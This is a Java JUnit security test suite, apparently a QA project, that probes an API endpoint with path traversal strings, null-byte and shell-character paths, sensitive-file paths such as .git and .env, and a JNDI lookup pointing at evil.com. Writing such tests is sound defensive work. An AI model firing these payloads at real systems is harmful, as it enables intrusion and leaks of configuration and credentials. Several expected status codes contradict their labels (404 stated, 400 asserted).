package com.example.security;

import com.example.base.TestBase;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;
import io.qameta.allure.*;
import java.util.Random;

import static io.qameta.allure.SeverityLevel.*;

/**
 * Комплексные security тесты endpoint'ов API
 * Проверяет безопасность на уровне URL/path манипуляций
 */
@DisplayName("Security: Endpoint Testing")
@Tag("security")
@Tag("endpoint")
@Epic("Security")
@Feature("Endpoint Security")
public class EndpointSecurityTest extends TestBase {

    @ParameterizedTest(name = "ENDPOINT-001: Регистр пути '{0}' → {1}")
    @CsvSource({
            "/endpoint,     200, 'Правильный регистр'",
            "/ENDPOINT,     404, 'Верхний регистр'",
            "/Endpoint,     404, 'Capitalized'",
            "/eNdPoInT,     404, 'Случайный регистр'",
            "/endPoint,     404, 'CamelCase'",
            "/ENDpoint,     404, 'Частично верхний'",
            "/endpoinT,     404, 'Последняя буква верхняя'",
            "/end-point,    404, 'С дефисом'",
            "/end_point,    404, 'С подчеркиванием'",
            "/end.point,    404, 'С точкой'",
            "/end+point,    404, 'С плюсом'",
            "/end%20point,  404, 'С пробелом URL encoded'"
    })
    @Tag("065")
    @DisplayName("Регистрозависимость endpoint'а")
    @Severity(CRITICAL)
    void endpointCaseSensitivity(String path, int expectedStatus, String description) {
        Allure.step("Тестирование регистрозависимости: " + description, () -> {
            Allure.addAttachment("Путь", "text/plain", path);
            Allure.addAttachment("Описание", "text/plain", description);
            Allure.addAttachment("Ожидаемый статус", "text/plain", String.valueOf(expectedStatus));

            if (expectedStatus == 200) {
                Allure.step("Проверка валидного пути /endpoint", () -> {
                    String token = generateToken();
                    Allure.addAttachment("Токен", "text/plain", token);

                    given()
                            .formParam("token", token)
                            .formParam("action", "LOGIN")
                            .when()
                            .post(path)
                            .then()
                            .statusCode(expectedStatus)
                            .body("result", org.hamcrest.Matchers.equalTo("OK"));

                    Allure.addAttachment("Результат", "text/plain",
                            "✓ Путь /endpoint в правильном регистре работает\n✓ Статус 200 OK");
                });
            } else {
                Allure.step("Проверка неверного пути: " + path, () -> {
                    Allure.addAttachment("Ожидание", "text/plain",
                            "Путь в неправильном регистре должен вернуть 404");

                    given()
                            .when()
                            .post(path)
                            .then()
                            .statusCode(expectedStatus);

                    Allure.addAttachment("Результат", "text/plain",
                            "✓ Путь " + path + " отклонен\n✓ Статус 404 Not Found");
                });
            }
        });
    }

    @ParameterizedTest(name = "ENDPOINT-002: Path traversal '{0}' → 404")
    @ValueSource(strings = {
            "/../endpoint",
            "/endpoint/../admin",
            "/endpoint/..",
            "/endpoint/./",
            "/endpoint//",
            "/endpoint/../../../etc/passwd",
            "/endpoint/../../WEB-INF/web.xml",
            "/endpoint/%2e%2e/admin",
            "/endpoint/%2e%2e%2fadmin",
            "/endpoint\0",
            "/endpoint%00",
            "/endpoint/..\\admin",
            "/endpoint/;../admin",
            "/endpoint/|../admin",
            "/endpoint/`../admin",
            "/endpoint/$HOME/../admin"
    })
    @Tag("066")
    @DisplayName("Защита от path traversal в URL")
    @Severity(CRITICAL)
    void endpointPathTraversal(String path) {
        Allure.step("Тестирование path traversal: " + path, () -> {
            Allure.addAttachment("Путь с traversal", "text/plain", path);
            Allure.addAttachment("Тип атаки", "text/plain", getTraversalType(path));
            Allure.addAttachment("Опасность", "text/plain",
                    "Попытка доступа к файлам/директориям вне разрешенной зоны");

            Allure.step("Отправка запроса с path traversal", () -> {
                Allure.addAttachment("Ожидание", "text/plain",
                        "404 Not Found без утечки информации и без 500 ошибок");

                given()
                        .when()
                        .post(path)
                        .then()
                        .statusCode(400)
                        .statusCode(org.hamcrest.Matchers.not(500))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("Exception")))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("at ")));

                Allure.addAttachment("Результат", "text/plain",
                        "✓ Path traversal отклонен безопасно:\n" +
                                "✓ Статус 404 (не 500!)\n" +
                                "✓ Нет stack trace в ответе\n" +
                                "✓ Информация не утекает");
            });
        });
    }

    @ParameterizedTest(name = "Другие пути '{0}' → 404")
    @CsvSource({
            "'/',             'Root path'",
            "'/api',          'API root'",
            "'/api/endpoint', 'API subpath'",
            "'/v1',           'API v1 root'",
            "'/v1/endpoint',  'API v1 endpoint'",
            "'/v2/endpoint',  'API v2 endpoint'",
            "'/admin',        'Admin path'",
            "'/login',        'Login path'",
            "'/auth',         'Auth path'",
            "'/health',       'Health check'",
            "'/status',       'Status'",
            "'/metrics',      'Metrics'",
            "'/swagger',      'Swagger UI'",
            "'/swagger-ui.html', 'Swagger HTML'",
            "'/actuator',     'Spring Actuator'",
            "'/actuator/health', 'Actuator health'",
            "'/graphql',      'GraphQL'",
            "'/rest',         'REST prefix'",
            "'/soap',         'SOAP'"
    })
    @Tag("067")
    @DisplayName("Другие пути должны возвращать 404")
    @Severity(NORMAL)
    void otherPathsShouldReturn404(String path, String description) {
        Allure.step("Тестирование пути: " + description, () -> {
            Allure.addAttachment("Путь", "text/plain", path);
            Allure.addAttachment("Назначение", "text/plain", description);

            Allure.step("Проверка всех HTTP методов для пути " + path, () -> {
                Allure.addAttachment("Ожидание", "text/plain",
                        "Все методы должны вернуть 404 для несуществующих путей");

                given().when().get(path).then().statusCode(404);
                given().when().post(path).then().statusCode(404);
                given().when().put(path).then().statusCode(404);
                given().when().delete(path).then().statusCode(404);
                given().when().patch(path).then().statusCode(404);
                given().when().head(path).then().statusCode(404);

                Allure.addAttachment("Результат", "text/plain",
                        "✓ Путь " + path + " не существует\n" +
                                "✓ Все HTTP методы возвращают 404\n" +
                                "✓ GET: 404 ✓ POST: 404 ✓ PUT: 404 ✓ DELETE: 404 ✓ PATCH: 404 ✓ HEAD: 404");
            });
        });
    }

    @ParameterizedTest(name = "Query params '{0}' → 400")
    @ValueSource(strings = {
            "/endpoint?debug=true",
            "/endpoint?token=123&action=LOGIN",
            "/endpoint?",
            "/endpoint?%20",
            "/endpoint?a=b&c=d",
            "/endpoint?a[]=b",
            "/endpoint?a=b#fragment",
            "/endpoint?callback=alert",
            "/endpoint?<script>",
            "/endpoint?${jndi:ldap://evil.com}"
    })
    @Tag("068")
    @DisplayName("Endpoint с query параметрами")
    @Severity(CRITICAL)
    void endpointWithQueryParameters(String path) {
        Allure.step("Тестирование endpoint с query параметрами", () -> {
            Allure.addAttachment("Путь с query", "text/plain", path);
            Allure.addAttachment("Проблема", "text/plain",
                    "Параметры в query string вместо body");

            Allure.step("Отправка POST с query параметрами", () -> {
                Allure.addAttachment("Ожидание", "text/plain",
                        "400 Bad Request - параметры должны быть только в теле запроса");

                given()
                        .when()
                        .post(path)
                        .then()
                        .statusCode(400)
                        .statusCode(org.hamcrest.Matchers.not(500))
                        .statusCode(org.hamcrest.Matchers.not(200));

                Allure.addAttachment("Результат", "text/plain",
                        "✓ Query параметры отклонены\n" +
                                "✓ Статус 400 Bad Request (не 200! не 500!)\n" +
                                "✓ Параметры должны быть в body, не в query string");
            });
        });
    }

    @ParameterizedTest(name = "ENDPOINT-005: Unicode path '{0}' → 404")
    @CsvSource({
            "'/endpoint/кириллица',     'Cyrillic'",
            "'/endpoint/中国',            'Chinese'",
            "'/endpoint/🐈',             'Emoji'",
            "'/endpoint/\u00E9',        'Latin-1 é'",
            "'/endpoint/\u20AC',        'Euro symbol'"
    })
    @Tag("069")
    @DisplayName("Unicode в пути endpoint'а")
    @Severity(NORMAL)
    void unicodeInEndpoint(String path, String description) {
        Allure.step("Тестирование Unicode в пути: " + description, () -> {
            Allure.addAttachment("Путь с Unicode", "text/plain", path);
            Allure.addAttachment("Тип символов", "text/plain", description);

            Allure.step("Отправка запроса с Unicode путем", () -> {
                Allure.addAttachment("Ожидание", "text/plain",
                        "400 Bad Request - не должно работать");

                given()
                        .when()
                        .post(path)
                        .then()
                        .statusCode(400)
                        .statusCode(org.hamcrest.Matchers.not(200));

                Allure.addAttachment("Результат", "text/plain",
                        "✓ Unicode пути отклонены\n✓ Статус 400 Bad Request");
            });
        });
    }

    @Test
    @Tag("070")
    @DisplayName("Очень длинный endpoint path")
    @Severity(CRITICAL)
    void veryLongEndpointPath() {
        Allure.description("Проверка защиты от buffer overflow через очень длинный путь");

        String longEndpoint = "/endpoint/" + "a".repeat(10000);

        Allure.step("1. Подготовка очень длинного пути", () -> {
            Allure.addAttachment("Длина пути", "text/plain", "~10,000 символов");
            Allure.addAttachment("Цель", "text/plain",
                    "Проверка устойчивости к buffer overflow атакам");
        });

        Allure.step("2. Отправка запроса с очень длинным путем", () -> {
            Allure.addAttachment("Ожидание", "text/plain",
                    "Должен вернуть 404/414/400, но не 200 и не падать с 500");

            given()
                    .when()
                    .post(longEndpoint)
                    .then()
                    .statusCode(org.hamcrest.Matchers.anyOf(
                            org.hamcrest.Matchers.is(404),
                            org.hamcrest.Matchers.is(414),
                            org.hamcrest.Matchers.is(400)
                    ))
                    .statusCode(org.hamcrest.Matchers.not(200));

            Allure.addAttachment("Результат", "text/plain",
                    "✓ Очень длинный путь обработан безопасно\n" +
                            "✓ Не вызвал buffer overflow\n" +
                            "✓ Вернул корректный код ошибки (404/414/400)");
        });
    }

    @ParameterizedTest(name = "ENDPOINT-007: Случайный путь #{0} → 404")
    @ValueSource(ints = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10})
    @Tag("071")
    @DisplayName("Случайные пути должны возвращать 404")
    @Severity(MINOR)
    void randomPathsShouldReturn404(int iteration) {
        Allure.step("Тестирование случайного пути #" + iteration, () -> {
            Random random = new Random(iteration);
            String randomPath = "/" + random.ints(97, 123)
                    .limit(random.nextInt(10) + 5)
                    .collect(StringBuilder::new,
                            StringBuilder::appendCodePoint,
                            StringBuilder::append)
                    .toString();

            Allure.addAttachment("Случайный путь", "text/plain", randomPath);
            Allure.addAttachment("Длина", "text/plain", randomPath.length() + " символов");

            if (!randomPath.equals("/endpoint")) {
                Allure.step("Отправка запроса на случайный путь", () -> {
                    Allure.addAttachment("Ожидание", "text/plain", "400 Bad Request");

                    given()
                            .when()
                            .post(randomPath)
                            .then()
                            .statusCode(400)
                            .statusCode(org.hamcrest.Matchers.not(200));

                    Allure.addAttachment("Результат", "text/plain",
                            "✓ Случайный путь " + randomPath + " отклонен\n✓ Статус 400");
                });
            } else {
                Allure.addAttachment("Пропуск", "text/plain",
                        "Случайно сгенерирован правильный путь /endpoint - пропускаем");
            }
        });
    }

    @ParameterizedTest(name = "Info leak path '{0}'")
    @CsvSource({
            "'/.git',            'Git directory'",
            "'/.env',            'Environment file'",
            "'/config.properties','Configuration file'",
            "'/WEB-INF/web.xml', 'Web configuration'",
            "'/phpinfo.php',     'PHP info'",
            "'/admin.php',       'Admin panel'",
            "'/wp-admin',        'WordPress admin'",
            "'/console',         'Console'",
            "'/actuator',        'Spring Actuator'",
            "'/heapdump',        'Heap dump'",
            "'/threaddump',      'Thread dump'",
            "'/trace',           'Request trace'",
            "'/env',             'Environment'",
            "'/beans',           'Spring beans'",
            "'/mappings',        'URL mappings'",
            "'/.git/HEAD',       'Git HEAD'",
            "'/.git/config',     'Git config'",
            "'/wp-login.php',    'WordPress login'"
    })
    @Tag("072")
    @DisplayName("Проверка на информационную утечку")
    @Severity(CRITICAL)
    void noInformationLeakage(String path, String description) {
        Allure.step("Проверка на info leak: " + description, () -> {
            Allure.addAttachment("Чувствительный путь", "text/plain", path);
            Allure.addAttachment("Риск", "text/plain",
                    "Утечка конфигурации, кода, чувствительной информации");

            Allure.step("Запрос GET на чувствительный путь", () -> {
                Allure.addAttachment("Ожидание", "text/plain",
                        "400 Bad Request без утечки информации и без 500 ошибок");

                given()
                        .when()
                        .get(path)
                        .then()
                        .statusCode(400)
                        .statusCode(org.hamcrest.Matchers.not(200))
                        .statusCode(org.hamcrest.Matchers.not(500))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("Exception")))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("at ")))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("Caused by")))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("password")))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("secret")))
                        .body(org.hamcrest.Matchers.not(org.hamcrest.Matchers.containsString("key=")));

                Allure.addAttachment("Результат", "text/plain",
                        "✓ Info leak защита работает:\n" +
                                "✓ Статус 400 (не 200! не 500!)\n" +
                                "✓ Нет stack trace\n" +
                                "✓ Нет чувствительной информации в ответе\n" +
                                "✓ Защита от информации об инфраструктуре");
            });
        });
    }

    @ParameterizedTest(name = "ENDPOINT-009: Метод {0} для '{1}' → 404/405")
    @CsvSource({
            "GET,     /admin,     400",
            "POST,    /admin,     400",
            "PUT,     /admin,     400",
            "DELETE,  /admin,     400",
            "PATCH,   /admin,     400",
            "HEAD,    /admin,     400",
            "OPTIONS, /admin,     400",
            "TRACE,   /admin,     400",
            "GET,     /api,       400",
            "POST,    /api,       400",
            "GET,     /v1,        400",
            "POST,    /v1,        400"
    })
    @Tag("073")
    @DisplayName("Неправильные пути для всех HTTP методов")
    @Severity(NORMAL)
    void wrongPathsAllMethods(String method, String path, int expectedStatus) {
        Allure.step("Тестирование " + method + " для пути: " + path, () -> {
            Allure.addAttachment("Метод", "text/plain", method);
            Allure.addAttachment("Путь", "text/plain", path);
            Allure.addAttachment("Ожидаемый статус", "text/plain", String.valueOf(expectedStatus));

            Allure.step("Выполнение " + method + " запроса", () -> {
                switch (method) {
                    case "GET" -> given().when().get(path).then().statusCode(expectedStatus);
                    case "POST" -> given().when().post(path).then().statusCode(expectedStatus);
                    case "PUT" -> given().when().put(path).then().statusCode(expectedStatus);
                    case "DELETE" -> given().when().delete(path).then().statusCode(expectedStatus);
                    case "PATCH" -> given().when().patch(path).then().statusCode(expectedStatus);
                    case "HEAD" -> given().when().head(path).then().statusCode(expectedStatus);
                    case "OPTIONS" -> given().when().options(path).then().statusCode(expectedStatus);
                    case "TRACE" -> given().when().request("TRACE", path).then().statusCode(expectedStatus);
                }

                Allure.addAttachment("Результат", "text/plain",
                        "✓ " + method + " для " + path + " вернул " + expectedStatus + "\n" +
                                "✓ Несуществующие пути корректно обрабатываются");
            });
        });
    }

    @ParameterizedTest(name = "Дублирование пути '{0}' → 404")
    @ValueSource(strings = {
            "/endpoint/endpoint",
            "/endpointendpoint",
            "/endpoint-endpoint",
            "/endpoint_endpoint",
            "/endpoint//endpoint",
            "/endpoint/./endpoint"
    })
    @Tag("074")
    @DisplayName("Дублирование endpoint в пути")
    @Severity(MINOR)
    void duplicateEndpointInPath(String path) {
        Allure.step("Тестирование дублированного пути: " + path, () -> {
            Allure.addAttachment("Дублированный путь", "text/plain", path);
            Allure.addAttachment("Проблема", "text/plain",
                    "Попытка обхода через дублирование имени endpoint");

            Allure.step("Отправка запроса с дублированным путем", () -> {
                Allure.addAttachment("Ожидание", "text/plain", "400 Bad Request");

                given()
                        .when()
                        .post(path)
                        .then()
                        .statusCode(400)
                        .statusCode(org.hamcrest.Matchers.not(200));

                Allure.addAttachment("Результат", "text/plain",
                        "✓ Дублированный путь отклонен\n✓ Статус 400 Bad Request");
            });
        });
    }

    private String getTraversalType(String path) {
        if (path.contains("../")) return "Directory traversal (..)";
        if (path.contains("%2e%2e")) return "URL encoded traversal";
        if (path.contains("\0") || path.contains("%00")) return "Null byte injection";
        if (path.contains("..\\")) return "Windows style traversal";
        if (path.contains("/./")) return "Current directory traversal";
        if (path.contains("//")) return "Double slash";
        return "Path manipulation";
    }
}